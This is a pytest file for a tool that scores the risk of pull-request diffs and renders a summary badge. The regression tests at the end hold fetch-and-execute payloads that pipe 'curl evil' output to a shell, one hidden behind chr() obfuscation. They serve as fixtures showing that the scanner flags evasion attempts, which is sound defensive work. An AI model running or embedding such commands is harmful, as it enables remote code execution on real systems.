from scpe import seal

CLEAN = "--- a/f.py\n+++ b/f.py\n@@ -1,1 +1,1 @@\n-a\n+b = 1\n"
NET = "--- a/f.py\n+++ b/f.py\n@@ -1,0 +1,1 @@\n+import requests\n"
SUB = "--- a/x.py\n+++ b/x.py\n@@ -1,0 +1,1 @@\n+    subprocess.run(['ls'])\n"


def test_risk_low_when_no_flags():
    r = seal.risk_band(CLEAN)
    assert r["band"] == "LOW" and r["flags"] == []


def test_risk_med_on_network():
    r = seal.risk_band(NET)
    assert r["band"] == "MED"
    assert any(f["pattern"] == "requests" and f["file"] == "f.py" for f in r["flags"])


def test_risk_high_on_subprocess_with_location():
    r = seal.risk_band(SUB)
    assert r["band"] == "HIGH"
    f = r["flags"][0]
    assert f["pattern"] == "subprocess" and f["file"] == "x.py" and f["line"] == 1


def test_risk_only_scans_added_lines_not_context_or_headers():
    # a context line (leading space) mentioning subprocess must NOT trip the gate
    ctx = "--- a/f.py\n+++ b/f.py\n@@ -1,1 +1,1 @@\n subprocess is fine in a comment\n+x = 1\n"
    assert seal.risk_band(ctx)["band"] == "LOW"


def test_pr_seal_low_is_ascii_fixed_width_and_verdict_first():
    s = seal.pr_seal(login="augbastos", verified=True,
                     profile="https://github.com/augbastos", band="LOW", flags=[],
                     added=14, removed=3, files=["oui.js", "discovery.js"],
                     tests_ok=True, tests_summary="35 passed / 0 failed",
                     provenance="AI-assisted (Claude), self-verified",
                     hook="fixes your failing test: oui.test.js RED -> green")
    s.encode("ascii")
    assert "LOW RISK" in s and "@augbastos" in s
    assert "fixes your failing test" in s
    assert {len(l) for l in s.splitlines()} == {62}


def test_pr_seal_high_leads_with_the_danger():
    s = seal.pr_seal(login="stranger", verified=True, profile="p", band="HIGH",
                     flags=[{"pattern": "subprocess", "file": "x.py", "line": 74, "added": ""}],
                     added=90, removed=2, files=["x.py"], tests_ok=True,
                     tests_summary="ok", provenance="hand-authored", hook="")
    lines = s.splitlines()
    # the danger flag appears before the contributor row
    danger_i = next(i for i, l in enumerate(lines) if "subprocess" in l and "x.py:74" in l)
    contrib_i = next(i for i, l in enumerate(lines) if "@stranger" in l)
    assert danger_i < contrib_i
    assert "HIGH RISK" in s


def test_pr_pill_is_markdown_with_shields_badges():
    p = seal.pr_pill("LOW", "augbastos", True, True)
    assert p.startswith("###")
    assert "img.shields.io/badge/" in p


def test_risk_band_is_explainable_not_a_magic_score():
    # published, weightless rule set — reproducible; LOW = zero rules matched.
    r = seal.risk_band(CLEAN)
    assert r["matched"] == [] and r["rules_checked"] == seal.RULE_COUNT
    r2 = seal.risk_band(SUB)
    assert "subprocess" in r2["matched"] and r2["rules_checked"] == seal.RULE_COUNT


def test_pr_summary_line_is_the_5_second_glance():
    s = seal.pr_summary_line("LOW", verified=True, tests_ok=True)
    assert "identity verified" in s and "tests passed" in s and "risk LOW" in s
    bad = seal.pr_summary_line("HIGH", verified=False, tests_ok=False)
    assert "identity UNVERIFIED" in bad and "tests FAILED" in bad and "risk HIGH" in bad


# --- adversarial regressions (appsec verify, 2026-07-21) ---------------------------

def test_pr_pill_reflects_real_verified_state_not_always_green():
    """FIX: the pill hardcoded '@login-verified-green' regardless of identity. An UNVERIFIED
    contributor must render UNVERIFIED (red), never 'verified'."""
    ok = seal.pr_pill("LOW", "augbastos", True, True)
    assert "augbastos-verified-2ea043" in ok
    bad = seal.pr_pill("HIGH", "stranger", False, True)
    assert "stranger-UNVERIFIED-cf222e" in bad
    assert "stranger-verified" not in bad


def test_added_line_whose_source_starts_with_plus_is_still_scanned():
    """FIX: `if line.startswith('+++')` dropped an ADDED line like `+++counter; exec(...)`
    (source `++counter...`) as if it were the `+++ b/file` header, leaving it unscanned."""
    diff = ("--- a/f.js\n+++ b/f.js\n@@ -1,0 +1,1 @@\n"
            "+++counter; require('child_process').exec('curl evil|sh')\n")
    r = seal.risk_band(diff)
    assert r["band"] == "HIGH"
    assert any(f["pattern"] == "exec" for f in r["flags"])


def test_obfuscation_raises_risk_instead_of_evading():
    """FIX: a getattr(os, chr(...))(...) obfuscation used to render LOW/green. The chr(
    obfuscation smell must lift it off LOW so the seal says 'look here'."""
    diff = ("--- a/f.py\n+++ b/f.py\n@@ -1,0 +1,2 @@\n"
            "+_n = ''.join(chr(c) for c in (115, 121, 115))\n"
            "+getattr(os, _n)('curl http://evil/x | sh')\n")
    r = seal.risk_band(diff)
    assert r["band"] != "LOW"
    assert any(f["pattern"] == "chr" for f in r["flags"])
